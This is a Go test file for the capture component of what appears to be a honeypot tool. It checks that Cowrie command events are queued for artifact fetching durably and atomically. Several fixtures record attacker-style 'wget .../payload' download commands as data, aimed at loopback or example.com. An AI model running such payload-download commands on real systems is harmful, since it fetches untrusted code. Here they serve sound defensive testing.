package capture

import (
	"context"
	"database/sql"
	"fmt"
	"io"
	"net/http"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/config"
	"github.com/networkshard/shardlure/internal/store"
	"github.com/networkshard/shardlure/pkg/models"
)

type queueTransport func(*http.Request) (*http.Response, error)

func (f queueTransport) RoundTrip(r *http.Request) (*http.Response, error) { return f(r) }

func TestCommandCaptureOnlyEnqueues(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "queue.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	if err := st.AppendEventsAndUpsertActorsAgg([]*models.Event{{TS: time.Now(), Source: models.SourceCowrie, Kind: models.KindCommand, SrcIP: "8.8.8.8", Command: "wget http://127.0.0.1/payload"}}, nil); err != nil {
		t.Fatal(err)
	}
	r := NewRunner(st, config.Config{DataDir: t.TempDir()})
	r.fetch.TestLoopback = true
	calls := 0
	r.fetch.Client = &http.Client{Transport: queueTransport(func(req *http.Request) (*http.Response, error) {
		calls++
		return &http.Response{StatusCode: 200, Body: io.NopCloser(strings.NewReader("payload")), Header: make(http.Header)}, nil
	})}
	n, err := r.fetchFromCommands(context.Background())
	if err != nil {
		t.Fatal(err)
	}
	if calls != 0 {
		t.Fatalf("ingest discovery performed %d network requests", calls)
	}
	if n != 1 {
		t.Fatalf("queued %d, want 1", n)
	}
	due, err := st.DueArtifactCaptures(time.Now(), 10, 5)
	if err != nil || len(due) != 1 {
		t.Fatalf("durable queue=%v error=%v", due, err)
	}
	w := NewArtifactWorker(st, r.fetch, 5, time.Minute)
	w.tick(context.Background())
	if calls != 1 {
		t.Fatalf("worker network calls=%d", calls)
	}
	rows, err := st.ListRecentArtifacts(10)
	if err != nil || len(rows) != 1 || rows[0].Status != "fetched" || rows[0].LastSuccessfulFetchAt.IsZero() {
		t.Fatalf("completed artifacts=%+v error=%v", rows, err)
	}
}

func TestCommandDiscoverySurvivesBurstAndRestart(t *testing.T) {
	dbPath := filepath.Join(t.TempDir(), "burst.db")
	st, err := store.Open(dbPath)
	if err != nil {
		t.Fatal(err)
	}
	defer func() { st.Close() }()
	now := time.Now()
	var events []*models.Event
	for i := 0; i < 4205; i++ {
		events = append(events, &models.Event{TS: now.Add(time.Duration(i) * time.Second), Source: models.SourceCowrie, Kind: models.KindCommand, Command: fmt.Sprintf("wget https://example.com/payload-%d", i)})
	}
	if err := st.AppendEventsAndUpsertActorsAgg(events, nil); err != nil {
		t.Fatal(err)
	}
	total := 0
	for i := 0; i < 4; i++ {
		r := NewRunner(st, config.Config{DataDir: t.TempDir()})
		n, err := r.fetchFromCommands(context.Background())
		if err != nil {
			t.Fatal(err)
		}
		total += n
		if err := st.Close(); err != nil {
			t.Fatal(err)
		}
		st, err = store.Open(dbPath)
		if err != nil {
			t.Fatal(err)
		}
	}
	if total != 4205 {
		t.Fatalf("queued %d of 4205 burst commands across restarts", total)
	}
	// A backfilled command has an older event timestamp but a new durable ID.
	if err := st.AppendEventsAndUpsertActorsAgg([]*models.Event{{TS: now.Add(-time.Hour), Source: models.SourceCowrie, Kind: models.KindCommand, Command: "wget https://example.com/late-arrival"}}, nil); err != nil {
		t.Fatal(err)
	}
	r := NewRunner(st, config.Config{DataDir: t.TempDir()})
	n, err := r.fetchFromCommands(context.Background())
	if err != nil || n != 1 {
		t.Fatalf("late arrival queued=%d err=%v", n, err)
	}
}

func TestCommandDiscoveryRollsBackQueueAndCursor(t *testing.T) {
	st, err := store.Open(filepath.Join(t.TempDir(), "atomic.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer st.Close()
	var events []*models.Event
	for _, name := range []string{"first", "reject"} {
		events = append(events, &models.Event{TS: time.Now(), Source: models.SourceCowrie, Kind: models.KindCommand, Command: "wget https://example.com/" + name})
	}
	if err := st.AppendEventsAndUpsertActorsAgg(events, nil); err != nil {
		t.Fatal(err)
	}
	if err := st.WithTx(func(tx *sql.Tx) error {
		_, err := tx.Exec(`CREATE TRIGGER reject_discovery BEFORE INSERT ON artifacts WHEN NEW.url='https://example.com/reject' BEGIN SELECT RAISE(ABORT,'injected queue failure'); END`)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	r := NewRunner(st, config.Config{DataDir: t.TempDir()})
	if _, err := r.fetchFromCommands(context.Background()); err == nil {
		t.Fatal("queue failure swallowed")
	}
	rows, err := st.ListRecentArtifacts(10)
	if err != nil || len(rows) != 0 {
		t.Fatalf("partial discovery committed: %+v %v", rows, err)
	}
	if err := st.WithTx(func(tx *sql.Tx) error { _, err := tx.Exec(`DROP TRIGGER reject_discovery`); return err }); err != nil {
		t.Fatal(err)
	}
	n, err := r.fetchFromCommands(context.Background())
	if err != nil || n != 2 {
		t.Fatalf("retry queued=%d err=%v", n, err)
	}
}
